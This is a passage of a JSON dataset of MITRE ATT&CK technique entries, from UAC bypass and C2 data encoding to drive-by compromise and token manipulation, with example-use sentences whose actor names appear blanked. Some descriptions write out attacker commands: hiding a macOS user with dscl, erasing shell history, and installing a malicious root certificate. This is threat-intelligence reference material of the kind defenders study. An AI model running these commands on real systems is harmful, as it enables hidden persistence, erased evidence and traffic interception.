      "can bypass UAC and create an elevated COM object to escalate privileges.",
      "Many  samples can perform UAC bypass by using eventvwr.exe to execute a malicious file.",
      "can bypass Windows UAC through either DLL hijacking, eventvwr, or appPaths.",
      "malware xxmm contains a UAC bypass tool for privilege escalation.",
      "bypasses user access control by using a DLL hijacking vulnerability in the Windows Update Standalone Installer (wusa.exe).",
      "contains many methods for bypassing Windows User Account Control on multiple versions of the operating system.",
      "attempts to bypass default User Access Control (UAC) settings by exploiting a backward-compatibility setting found in Windows 7 and later.",
      "can use a number of known techniques to bypass Windows UAC.",
      "can attempt to run the program as admin, then show a fake error message and a legitimate UAC bypass prompt to the user in an attempt to socially engineer the user into escalating privileges.",
      "attempts to escalate privileges by bypassing User Access Control.",
      "attempts to disable UAC remote restrictions by modifying the Registry.",
      "contains UAC bypass code for both 32- and 64-bit systems.",
      "bypasses UAC to escalate privileges by using a custom “RedirectEXE” shim database.",
      "bypassed User Access Control (UAC).",
      "has bypassed UAC."
    ],
    "id": "T1088",
    "name": "Bypass User Account Control",
    "similar_words": [
      "Bypass User Account Control"
    ]
  },
  "attack-pattern--cc7b8c4e-9be0-47ca-b0bb-83915ec3ee2f": {
    "description": "Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.",
    "example_uses": [
      "encodes commands from the control server using a range of characters and gzip.",
      "encoded C2 traffic with base64.",
      "encodes files before exfiltration.",
      "An  HTTP malware variant used Base64 to encode communications to the C2 server.",
      "can use base64 encoded C2 communications.",
      "encodes data in hexadecimal format over the C2 channel.",
      "encodes communications to the C2 server in Base64.",
      "A  malware sample encodes data with base64.",
      "encodes C2 traffic with base64.",
      "A  variant encodes C2 POST data base64.",
      "For C2 over HTTP,  encodes data with base64 and sends it via the \"Cookie\" field of HTTP requests. For C2 over DNS,  converts ASCII characters into their hexadecimal values and sends the data in cleartext.",
      "Several  tools encode data with base64 when posting it to a C2 server.",
      "uses custom base64 encoding to obfuscate HTTP traffic.",
      "uses Base64 encoding for communication in the message body of an HTTP request.",
      "C2 messages are Base64-encoded.",
      "encodes C2 traffic with base64.",
      "C2 traffic from  is encrypted, then encoded with Base64 encoding.",
      "exfiltrates data using cookie values that are Base64-encoded.",
      "network traffic is Base64-encoded plaintext.",
      "C2 traffic is base64-encoded.",
      "encodes C2 traffic with Base64.",
      "Responses from the  C2 server are base32-encoded.",
      "uses Base64 encoding for C2 traffic.",
      "uses Base64 encoding for C2 traffic.",
      "has sent a C2 response that was base64-encoded.",
      "used Base64 to encode C2 traffic.",
      "After encrypting C2 data  converts it into a hexadecimal representation and then encodes it into base64.",
      "provides various transform functions to encode and/or randomize C2 data.",
      "has used encoded data in HTTP URLs for C2.",
      "sends the payload from the C2 server as an encoded URL parameter.",
      "obfuscates C2 traffic with an altered version of base64.",
      "sent commands to compromised F5 BIG-IP devices in an encoded format requiring a passkey before interpretation and execution."
    ],
    "id": "T1132",
    "name": "Data Encoding",
    "similar_words": [
      "Data Encoding"
    ]
  },
  "attack-pattern--ce73ea43-8e77-47ba-9c11-5e9c9c58b9ff": {
    "description": "Every user account in macOS has a userID associated with it. When creating a user, you can specify the userID for that account. There is a property value in /Library/Preferences/com.apple.loginwindow called Hide500Users that prevents users with userIDs 500 and lower from appearing at the login screen. By using the [Create Account](https://attack.mitre.org/techniques/T1136) technique with a userID under 500 and enabling this property (setting it to Yes), an adversary can hide their user accounts much more easily: sudo dscl . -create /Users/username UniqueID 401 (Citation: Cybereason OSX Pirrit).",
    "example_uses": [],
    "id": "T1147",
    "name": "Hidden Users",
    "similar_words": [
      "Hidden Users"
    ]
  },
  "attack-pattern--d21a2069-23d5-4043-ad6d-64f6b644cb1a": {
    "description": "Compiled HTML files (.chm) are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. (Citation: Microsoft HTML Help May 2018) CHM content is displayed using underlying components of the Internet Explorer browser (Citation: Microsoft HTML Help ActiveX) loaded by the HTML Help executable program (hh.exe). (Citation: Microsoft HTML Help Executable Program)\n\nAdversaries may abuse this technology to conceal malicious code. A custom CHM file containing embedded payloads could be delivered to a victim then triggered by [User Execution](https://attack.mitre.org/techniques/T1204). CHM execution may also bypass application whitelisting on older and/or unpatched systems that do not account for execution of binaries through hh.exe. (Citation: MsitPros CHM Aug 2017) (Citation: Microsoft CVE-2017-8625 Aug 2017)",
    "example_uses": [
      "has used CHM files to move concealed payloads as part of.",
      "has used a CHM payload to load and execute another malicious file once delivered to a victim.",
      "leveraged a compiled HTML file that contained a command to download and run an executable."
    ],
    "id": "T1223",
    "name": "Compiled HTML File",
    "similar_words": [
      "Compiled HTML File"
    ]
  },
  "attack-pattern--d28ef391-8ed4-45dc-bc4a-2f43abf54416": {
    "description": "Adversaries may leverage information repositories to mine valuable information. Information repositories are tools that allow for storage of information, typically to facilitate collaboration or information sharing between users, and can store a wide variety of data that may aid adversaries in further objectives, such as Credential Access, Lateral Movement, or Defense Evasion, or direct access to the target information. Adversaries may also abuse external sharing features to share sensitive documents with recipients outside of the organization (i.e., [Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537)). The following is a brief list of example information that may hold potential value to an adversary and may also be found on an information repository:* Policies, procedures, and standards* Physical / logical network diagrams* System architecture diagrams* Technical system documentation* Testing / development credentials (i.e., [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)) * Work / project schedules* Source code snippets* Links to network shares and other internal resources* Contact or other sensitive information about business partners and customers, including personally identifiable information (PII) Information stored in a repository may vary based on the specific instance or environment. Specific common information repositories include the following:* Storage services such as IaaS databases, enterprise databases, and more specialized platforms such as customer relationship management (CRM) databases * Collaboration platforms such as SharePoint, Confluence, and code repositories* Messaging platforms such as Slack and Microsoft Teams In some cases, information repositories have been improperly secured, typically by unintentionally allowing for overly-broad access by all users or even public access to unauthenticated users. This is particularly common with cloud-native or cloud-hosted services, such as AWS Relational Database Service (RDS), Redis, or ElasticSearch.(Citation: Mitiga)(Citation: TrendMicro Exposed Redis 2020)(Citation: Cybernews Reuters Leak 2022)",
    "example_uses": [
      "used a SharePoint enumeration and data dumping tool known as spwebmember.",
      "has collected information from Microsoft SharePoint services within target networks.",
      "is used to enumerate and dump information from Microsoft SharePoint.",
      "exfiltrates data of interest from enterprise databases using Adminer.",
      "has collected schemas and user accounts from systems running SQL Server.",
      "During the   accessed victims' internal knowledge repositories (wikis) to view sensitive corporate information on products services and internal business operations.",
      "has accessed victim security and IT environments and Microsoft Teams to mine valuable information.",
      "has collected files from various information repositories.",
      "has used a custom .NET tool to collect documents from an organization's internal central database.",
      "has searched a victim's network for organization collaboration channels like MS Teams or Slack to discover further high-privilege account credentials.",
      "has the ability to list and extract data from SQL databases.",
      "collected data from victim Oracle databases using SQLULDR2.",
      "includes a module capable of stealing content from the Tencent QQ database storing user QQ message history on infected devices.",
      "gathers information from repositories associated with cryptocurrency wallets and the Telegram messaging service.",
      "gathered information from SQL servers and Building Management System (BMS) servers during .",
      "gathers information from the Government Public Key Infrastructure (GPKI) folder associated with South Korean government public key infrastructure on infected systems.",
      "used the tool Adminer to remotely logon to the MySQL service of victim machines."
    ],
    "id": "T1213",
    "name": "Data from Information Repositories",
    "similar_words": [
      "Data from Information Repositories"
    ]
  },
  "attack-pattern--d3046a90-580c-4004-8208-66915bc29830": {
    "description": "macOS and Linux both keep track of the commands users type in their terminal so that users can easily remember what they've done. These logs can be accessed in a few different ways. While logged in, this command history is tracked in a file pointed to by the environment variable HISTFILE. When a user logs off a system, this information is flushed to a file in the user's home directory called ~/.bash_history. The benefit of this is that it allows users to go back to commands they've used before in different sessions. Since everything typed on the command-line is saved, passwords passed in on the command line are also saved. Adversaries can abuse this by searching these files for cleartext passwords. Additionally, adversaries can use a variety of methods to prevent their own commands from appear in these logs such as unset HISTFILE, export HISTFILESIZE=0, history -c, rm ~/.bash_history.",
    "example_uses": [],
    "id": "T1146",
    "name": "Clear Command History",
    "similar_words": [
      "Clear Command History"
    ]
  },
  "attack-pattern--d3df754e-997b-4cf9-97d4-70feb3120847": {
    "description": "Spearphishing via service is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of third party services rather than directly via enterprise email channels. \n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries send messages through various social media services, personal webmail, and other non-enterprise controlled services. These services are more likely to have a less-strict security policy than an enterprise. As with most kinds of spearphishing, the goal is to generate rapport with the target or get the target's interest in some way. Adversaries will create fake social media accounts and message employees for potential job opportunities. Doing so allows a plausible reason for asking about services, policies, and software that's running in an environment. The adversary can then send malicious links or attachments through these services.\n\nA common example is to build rapport with a target via social media, then send content to a personal webmail service that the target uses on their work computer. This allows an adversary to bypass some email restrictions on the work account, and the target is more likely to open the file since it's something they were expecting. If the payload doesn't work as expected, the adversary can continue normal communications and troubleshoot with the target on how to get it working.",
    "example_uses": [
      "spearphished victims via Facebook and Whatsapp.",
      "used various social media channels to spearphish victims."
    ],
    "id": "T1194",
    "name": "Spearphishing via Service",
    "similar_words": [
      "Spearphishing via Service"
    ]
  },
  "attack-pattern--d40239b3-05ff-46d8-9bdd-b46d13463ef9": {
    "description": "Adversaries may physically introduce computer accessories, networking hardware, or other computing devices into a system or network that can be used as a vector to gain access. Rather than just connecting and distributing payloads via removable storage (i.e. [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091)), more robust hardware additions can be used to introduce new functionalities and/or features into a system that can then be abused.While public references of usage by threat actors are scarce, many red teams/penetration testers leverage hardware additions for initial access. Commercial and open source products can be leveraged with capabilities such as passive network tapping, network traffic modification (i.e. [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)), keystroke injection, kernel memory reading via DMA, addition of new wireless access points to an existing network, and others.(Citation: Ossmann Star Feb 2011)(Citation: Aleks Weapons Nov 2015)(Citation: Frisk DMA August 2016)(Citation: McMillan Pwn March 2012)",
    "example_uses": [
      "used Bash Bunny Raspberry Pi netbooks or inexpensive laptops to connect to the companys local network.",
      "physically connected Bash Bunny Raspberry Pi netbooks and inexpensive laptops to the target organization's environment to access the companys local network."
    ],
    "id": "T1200",
    "name": "Hardware Additions",
    "similar_words": [
      "Hardware Additions"
    ]
  },
  "attack-pattern--d519cfd5-f3a8-43a9-a846-ed0bb40672b1": {
    "description": "Root certificates are used in public key cryptography to identify a root certificate authority (CA). When a root certificate is installed, the system or application will trust certificates in the root's chain of trust that have been signed by the root certificate. (Citation: Wikipedia Root Certificate) Certificates are commonly used for establishing secure TLS/SSL communications within a web browser. When a user attempts to browse a website that presents a certificate that is not trusted an error message will be displayed to warn the user of the security risk. Depending on the security settings, the browser may not allow the user to establish a connection to the website.\n\nInstallation of a root certificate on a compromised system would give an adversary a way to degrade the security of that system. Adversaries have used this technique to avoid security warnings prompting users when compromised systems connect over HTTPS to adversary controlled web servers that spoof legitimate websites in order to collect login credentials. (Citation: Operation Emmental)\n\nAtypical root certificates have also been pre-installed on systems by the manufacturer or in the software supply chain and were used in conjunction with malware/adware to provide a man-in-the-middle capability for intercepting information transmitted over secure TLS/SSL communications. (Citation: Kaspersky Superfish)\n\nRoot certificates (and their associated chains) can also be cloned and reinstalled. Cloned certificate chains will carry many of the same metadata characteristics of the source and can be used to sign malicious code that may then bypass signature validation tools (ex: Sysinternals, antivirus, etc.) used to block execution and/or uncover artifacts of Persistence. (Citation: SpectorOps Code Signing Dec 2017)\n\nIn macOS, the Ay MaMi malware uses /usr/bin/security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain /path/to/malicious/cert to install a malicious certificate as a trusted root certificate into the system keychain. (Citation: objective-see ay mami 2018)",
    "example_uses": [
      "installs a root certificate to aid in man-in-the-middle actions.",
      "can be used to install browser root certificates as a precursor to performing man-in-the-middle between connections to banking websites. Example command: certutil -addstore -f -user ROOT ProgramData\\cert512121.der.",
      "can add a certificate to the Windows store."
    ],
    "id": "T1130",
    "name": "Install Root Certificate",
    "similar_words": [
      "Install Root Certificate"
    ]
  },
  "attack-pattern--d54416bd-0803-41ca-870a-ce1af7c05638": {
    "description": "Data is encrypted before being exfiltrated in order to hide the information that is being exfiltrated from detection or to make the exfiltration less conspicuous upon inspection by a defender. The encryption is performed by a utility, programming library, or custom algorithm on the data itself and is considered separate from any encryption performed by the command and control or file transfer protocol. Common file archive formats that can encrypt files are RAR and zip.\n\nOther exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over Command and Control Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048)",
    "example_uses": [
      "hides collected data in password-protected .rar archives.",
      "encrypts files with XOR before sending them back to the C2 server.",
      "adds collected files to a temp.zip file saved in the %temp% folder, then base64 encodes it and uploads it to control server.",
      "encrypted the collected files' path with AES and then encoded them with base64.",
      "encrypts collected data with AES and Base64 and then sends it to the C2 server.",
      "encrypts data using Base64 before being sent to the command and control server.",
      "uses a variation of the XOR cipher to encrypt files before exfiltration.",
      "encrypts the collected files using 3-DES.",
      "has created password-protected RAR, WinImage, and zip archives to be exfiltrated.",
      "has compressed and encrypted data into password-protected RAR archives prior to exfiltration.",
      "encrypts data with a substitute cipher prior to exfiltration.",
      "encodes credit card data it collected from the victim with XOR.",
      "encrypts collected data with an incremental XOR key prior to exfiltration.",
      "writes collected data to a temporary file in an encrypted form before exfiltration to a C2 server.",
      "Modules can be pushed to and executed by  that copy data to a staging area, compress it, and XOR encrypt it.",
      "encrypts with the 3DES algorithm and a hardcoded key prior to exfiltration.",
      "saves system information into an XML file that is then XOR-encoded.",
      "employs the same encoding scheme as  for data it stages. Data is compressed with zlib, and bytes are rotated four times before being XOR'ed with 0x23.",
      "Data  copies to the staging area is compressed with zlib. Bytes are rotated by four positions and XOR'ed with 0x23.",
      "encrypts collected data using a single byte XOR key.",
      "DES-encrypts captured credentials using the key 12345678 before writing the credentials to a log file.",
      "After collecting files and logs from the victim,  encrypts some collected data with Blowfish.",
      "TRINITY malware used by  encodes data gathered from the victim with a simple substitution cipher and single-byte XOR using the OxAA key.",
      "malware IndiaIndia saves information gathered about the victim to a file that is compressed with Zlib, encrypted, and uploaded to a C2 server.  malware RomeoDelta archives specified directories in .zip format, encrypts the .zip file, and uploads it to its C2 server. A  malware sample encrypts data using a simple byte based XOR operation prior to exfiltration.",
      "has used RAR to compress, encrypt, and password-protect files prior to exfiltration.",
      "is known to use RAR with passwords to encrypt data prior to exfiltration."
    ],
    "id": "T1022",
    "name": "Data Encrypted",
    "similar_words": [
      "Data Encrypted"
    ]
  },
  "attack-pattern--d742a578-d70e-4d0e-96a6-02a9c30204e6": {
    "description": "Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. Multiple ways of delivering exploit code to a browser exist (i.e., [Drive-by Target](https://attack.mitre.org/techniques/T1608/004)), including:* A legitimate website is compromised, allowing adversaries to inject malicious code* Script files served to a legitimate website from a publicly writeable cloud storage bucket are modified by an adversary* Malicious ads are paid for and served through legitimate ad providers (i.e., [Malvertising](https://attack.mitre.org/techniques/T1583/008))* Built-in web application interfaces that allow user-controllable content are leveraged for the insertion of malicious scripts or iFrames (e.g., cross-site scripting)Browser push notifications may also be abused by adversaries and leveraged for malicious code injection via [User Execution](https://attack.mitre.org/techniques/T1204). By clicking \"allow\" on browser push notifications, users may be granting a website permission to run JavaScript code on their browser.(Citation: Push notifications - viruspositive)(Citation: push notification -mcafee)(Citation: push notifications - malwarebytes)Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or a particular region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted campaign is often referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Shadowserver Strategic Web Compromise)Typical drive-by compromise process:1. A user visits a website that is used to host the adversary controlled content.2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version. The user may be required to assist in this process by enabling scripting, notifications, or active website components and ignoring warning dialog boxes.3. Upon finding a vulnerable version, exploit code is delivered to the browser.4. If exploitation is successful, the adversary will gain code execution on the user's system unless other protections are in place. In some cases, a second visit to the website after the initial scan is required before exploit code is delivered.Unlike [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190), the focus of this technique is to exploit software on a client endpoint upon visiting a website. This will commonly give an adversary access to systems on the internal network instead of external systems that may be in a DMZ.",
    "example_uses": [
      "compromised three Japanese websites using a Flash exploit to perform watering hole attacks.",
      "compromised legitimate organizations' websites to create watering holes to compromise victims.",
      "leveraged a watering hole to serve up malicious code.",
      "performed a watering hole attack on forbes.com in 2014 to compromise targets.",
      "has infected victims by tricking them into visiting compromised watering hole websites.",
      "has infected victims using watering holes.",
      "has has extensively used strategic Web compromises to target victims.",
      "delivered  to victims via a compromised legitimate website.",
      "has used strategic web compromises, particularly of South Korean websites, to distribute malware. The group has also used torrent file-sharing sites to more indiscriminately disseminate malware to victims. As part of their compromises, the group has used a Javascript based profiler called RICECURRY to profile a victim's web browser and deliver malicious code accordingly.",
      "has used watering holes to deliver files with exploits to initial victims.",
      "has sometimes used drive-by attacks against vulnerable browser plugins.",
      "has been delivered through compromised sites acting as watering holes.",
      "has delivered zero-day exploits and malware to victims by injecting malicious code into specific public Web pages visited by targets within a particular sector.",
      "was distributed through torrent file-sharing websites to South Korean victims, using a YouTube video downloader application as a lure.",
      "has used websites with malicious hyperlinks and iframes to infect targeted victims with   and other malicious tools.",
      "has distributed its malware via the RIG and SUNDOWN exploit kits as well as online advertising network Yandex.Direct.",
      "has used compromised websites to register custom URL schemes on a remote system.",
      "was distributed through torrent file-sharing websites to South Korean victims using a YouTube video downloader application as a lure.",
      "has performed watering hole attacks.",
      "has conducted watering holes schemes to gain initial access to victims.",
      "has been spread through malicious advertisements on websites.",
      "has used watering hole attacks to gain access.",
      "used embedded iframes on hotel login portals to redirect selected victims to download malware.",
      "has used watering hole attacks often with zero-day exploits to gain initial access to victims within a specific IP range.",
      "has compromised targets via strategic web compromise utilizing custom exploit kits.  used reflected cross-site scripting (XSS) against government websites to redirect users to phishing webpages.",
      "has compromised targets via strategic web compromise (SWC) utilizing a custom exploit kit.",
      "spread through watering holes on popular sites by injecting JavaScript into the HTML body or a .js file.",
      "During  the threat actors used a watering hole attack on a popular software reseller to exploit the then-zero-day Internet Explorer vulnerability CVE-2014-0322.",
      "delivered  and other malicious code to victims via a compromised legitimate website.",
      "has extensively used strategic web compromises to target victims.",
      "During  UNC3890 actors likely established a watering hole that was hosted on a login page of a legitimate Israeli shipping company that was active until at least November 2021.",
      "is typically bundled with pirated copies of Virtual Studio Technology (VST) for Windows and macOS.",
      "has been distributed through compromised websites with malicious content often masquerading as browser updates.",
      "has infected victim machines through compromised websites and exploit kits.",
      "has used drive-by downloads for initial infection often using fake browser updates as a lure.",
      "has used strategic web compromises particularly of South Korean websites to distribute malware. The group has also used torrent file-sharing sites to more indiscriminately disseminate malware to victims. As part of their compromises the group has used a Javascript based profiler called RICECURRY to profile a victim's web browser and deliver malicious code accordingly.",
      "has used compromised websites and Google Ads to bait victims into downloading its installer.",
      "has distributed  through a fake blog website.",
      "has been delivered to targets via downloads from malicious domains.",
      "has used watering hole attacks to deliver malicious versions of legitimate installers.",
      "has distributed Windows malware via drive-by downloads.",
      "has conducted watering-hole attacks through media and magazine websites.",
      "has cloned legitimate websites/applications to distribute the malware.",
      "created dedicated web pages mimicking legitimate government websites to deliver malicious fake anti-virus software.",
      "has used strategic website compromise to infect victims with malware such as .",
      "has used strategic website compromise for initial access against victims."
    ],
    "id": "T1189",
    "name": "Drive-by Compromise",
    "similar_words": [
      "Drive-by Compromise"
    ]
  },
  "attack-pattern--dc27c2ec-c5f9-4228-ba57-d67b590bda93": {
    "description": "To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a ‘hidden’ file. These files don’t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (dir /a for Windows and ls –a for Linux and macOS).\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system for persistence and evading a typical user or system analysis that does not incorporate investigation of hidden files.\n\n### Windows\n\nUsers can mark specific files as hidden by using the attrib.exe binary. Simply do attrib +h filename to mark a file or folder as hidden. Similarly, the “+s” marks a file as a system file and the “+r” flag marks the file as read only. Like most windows binaries, the attrib.exe binary provides the ability to apply these changes recursively “/S”.\n\n### Linux/Mac\n\nUsers can mark specific files as hidden simply by putting a “.” as the first character in the file or folder name  (Citation: Sofacy Komplex Trojan) (Citation: Antiquated Mac Malware). Files and folder that start with a period, ‘.’, are by default hidden from being viewed in the Finder application and standard command-line utilities like “ls”. Users must specifically change settings to have these files viewable. For command line usages, there is typically a flag to see all files (including hidden ones). To view these files in the Finder Application, the following command must be executed: defaults write com.apple.finder AppleShowAllFiles YES, and then relaunch the Finder Application.\n\n### Mac\n\nFiles on macOS can be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app (Citation: WireLurker).\nMany applications create these hidden files and folders to store information so that it doesn’t clutter up the user’s workspace. For example, SSH utilities create a .ssh folder that’s hidden and contains the user’s known hosts and keys.",
    "example_uses": [
      "saves itself with a leading \".\" to make it a hidden file.",
      "saves itself with a leading \".\" so that it's hidden from users by default.",
      "uses a hidden directory named .calisto to store data from the victim’s machine before exfiltration.",
      "stores itself in ~/Library/.DS_Stores/ ",
      "An  loader Trojan saves its payload with hidden file attributes.",
      "A  VBA Macro sets its file attributes to System and Hidden.",
      "The  payload is stored in a hidden directory at /Users/Shared/.local/kextd."
    ],
    "id": "T1158",
    "name": "Hidden Files and Directories",
    "similar_words": [
      "Hidden Files and Directories"
    ]
  },
  "attack-pattern--dc31fe1e-d722-49da-8f5f-92c7b5aff534": {
    "description": "Adversaries may create or modify references in user document templates to conceal malicious code or force authentication attempts. For example, Microsofts Office Open XML (OOXML) specification defines an XML-based format for Office documents (.docx, xlsx, .pptx) to replace older binary formats (.doc, .xls, .ppt). OOXML files are packed together ZIP archives compromised of various XML files, referred to as parts, containing properties that collectively define how a document is rendered.(Citation: Microsoft Open XML July 2017)Properties within parts may reference shared public resources accessed via online URLs. For example, template properties may reference a file, serving as a pre-formatted document blueprint, that is fetched when the document is loaded.Adversaries may abuse these templates to initially conceal malicious code to be executed via user documents. Template references injected into a document may enable malicious payloads to be fetched and executed when the document is loaded.(Citation: SANS Brian Wiltse Template Injection) These documents can be delivered via other techniques such as [Phishing](https://attack.mitre.org/techniques/T1566) and/or [Taint Shared Content](https://attack.mitre.org/techniques/T1080) and may evade static detections since no typical indicators (VBA macro, script, etc.) are present until after the malicious payload is fetched.(Citation: Redxorblue Remote Template Injection) Examples have been seen in the wild where template injection was used to load malicious code containing an exploit.(Citation: MalwareBytes Template Injection OCT 2017)Adversaries may also modify the *\\template control word within an .rtf file to similarly conceal then download malicious code. This legitimate control word value is intended to be a file destination of a template file resource that is retrieved and loaded when an .rtf file is opened. However, adversaries may alter the bytes of an existing .rtf file to insert a template control word field to include a URL resource of a malicious payload.(Citation: Proofpoint RTF Injection)(Citation: Ciberseguridad Decoding malicious RTF files)This technique may also enable [Forced Authentication](https://attack.mitre.org/techniques/T1187) by injecting a SMB/HTTPS (or other credential prompting) URL and triggering an authentication attempt.(Citation: Anomali Template Injection MAR 2018)(Citation: Talos Template Injection July 2017)(Citation: ryhanson phishery SEPT 2016)",
    "example_uses": [
      "used an open-source tool, Phishery, to inject malicious remote template URLs into Microsoft Word documents and then sent them to victims to enable .",
      "has injected SMB URLs into malicious Word spearphishing attachments to initiate .",
      "has used a weaponized Microsoft Word document with an embedded RTF exploit.",
      "During   used DOCX files to retrieve a malicious document template/DOTM file.",
      "delivered malicious documents with the XLSX extension typically used by OpenXML documents but the file itself was actually an OLE (XLS) document.",
      "used weaponized Microsoft Word documents abusing the remote template function to retrieve a malicious macro.",
      "During  the threat actors used trojanized documents that retrieved remote templates from an adversary-controlled website.",
      "has used DOCX files to download malicious DOT document templates and has used RTF template injection to download malicious payloads.  can also inject malicious macros or remote templates into documents already present on compromised systems.",
      "changed the template target of the settings.xml file embedded in the Word document and populated that field with the downloaded URL of the next payload.",
      "has used decoy documents to load malicious remote payloads via HTTP.",
      "has been install via template injection through a malicious DLL embedded within a template RTF in a Word document.",
      "used an open-source tool Phishery to inject malicious remote template URLs into Microsoft Word documents and then sent them to victims to enable ."
    ],
    "id": "T1221",
    "name": "Template Injection",
    "similar_words": [
      "Template Injection"
    ]
  },
  "attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48": {
    "description": "Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.An adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)Any standard user can use the runas command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.",
    "example_uses": [
      "grabs a user token using WTSQueryUserToken and then creates a process by impersonating a logged-on user.",
      "uses token manipulation with NtFilterToken as part of UAC bypass.",
      "Invoke-TokenManipulation Exfiltration module can be used to locate and impersonate user logon tokens.",
      "creates a backdoor through which remote attackers can adjust token privileges.",
      "can obtain a list of SIDs and provide the option for selecting process tokens to impersonate.",
      "has used CVE-2015-1701 to access the SYSTEM token and copy it into the current process as part of privilege escalation.",
      "can steal access tokens from exiting processes and make tokens from known credentials.",
      "keylogger KiloAlfa obtains user tokens from interactive sessions to execute itself with API call CreateProcessAsUserA under that user's context.",
      "examines running system processes for tokens that have specific system privileges. If it finds one, it will copy the token and store it for later use. Eventually it will start new processes with the stored token attached. It can also steal tokens to acquire administrative privileges.",
      "contains a feature to manipulate process privileges and tokens.",
      "can use `AdjustTokenPrivileges` to grant itself privileges for debugging with `SeDebugPrivilege` creating backups with `SeBackupPrivilege` loading drivers with `SeLoadDriverPrivilege` and shutting down a local system with `SeShutdownPrivilege`.",
      "modified its security token to grants itself debugging privileges by adding SeDebugPrivilege.",
      "Invoke-TokenManipulation Exfiltration module can be used to manipulate tokens.",
      "can gain system level privilege by passing SeDebugPrivilege to the AdjustTokenPrivilege API.",
      "has the ability to manipulate user tokens on targeted Windows systems.",
      "has used has used Metasploits named-pipe impersonation technique to escalate privileges.",
      "has used JuicyPotato to abuse the SeImpersonate token privilege to escalate from web application pool accounts to NT Authority\\SYSTEM.",
      "examines running system processes for tokens that have specific system privileges. If it finds one it will copy the token and store it for later use. Eventually it will start new processes with the stored token attached. It can also steal tokens to acquire administrative privileges.",
      "can use 's Invoke-TokenManipulation to manipulate access tokens.",
      "can use token manipulation to bypass UAC on Windows7 systems.",
      "has used SeDebugPrivilege and AdjustTokenPrivileges to elevate privileges.",
      "can use `AdjustTokenPrivileges()` to elevate privileges.",
      "During   used a ConfuserEx obfuscated BADPOTATO exploit to abuse named-pipe impersonation for local `NT AUTHORITY\\SYSTEM` privilege escalation.",
      "can use Invoke-TokenManipulation for manipulating tokens.",
      "has attempted to get the access token of a process by calling OpenProcessToken. If  gets the access token then it attempt to modify the token privileges with AdjustTokenPrivileges.",
      "has attempted to adjust its token privileges to have the SeDebugPrivilege.",
      "can enable SeDebugPrivilege and adjust token privileges.",
      "has the ability modify access tokens.",
      "has retrieved process tokens for processes to adjust the privileges of the launch process or other items.",
      "finds the `explorer.exe` process after execution and uses it to change the token of its executing thread."
    ],
    "id": "T1134",
    "name": "Access Token Manipulation",
    "similar_words": [
      "Access Token Manipulation"
    ]
  },
  "attack-pattern--dce31a00-1e90-4655-b0f9-e2e71a748a87": {
    "description": "The Windows Time service (W32Time) enables time synchronization across and within domains. (Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients. (Citation: Microsoft TimeProvider)\n\nTime providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of  HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\. (Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed. (Citation: Microsoft TimeProvider)\n\nAdversaries may abuse this architecture to establish Persistence, specifically by registering and enabling a malicious DLL as a time provider. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account. (Citation: Github W32Time Oct 2017)",
    "example_uses": [],
    "id": "T1209",
    "name": "Time Providers",
    "similar_words": [
      "Time Providers"
    ]
  },
  "attack-pattern--dd43c543-bb85-4a6f-aa6e-160d90d06a49": {
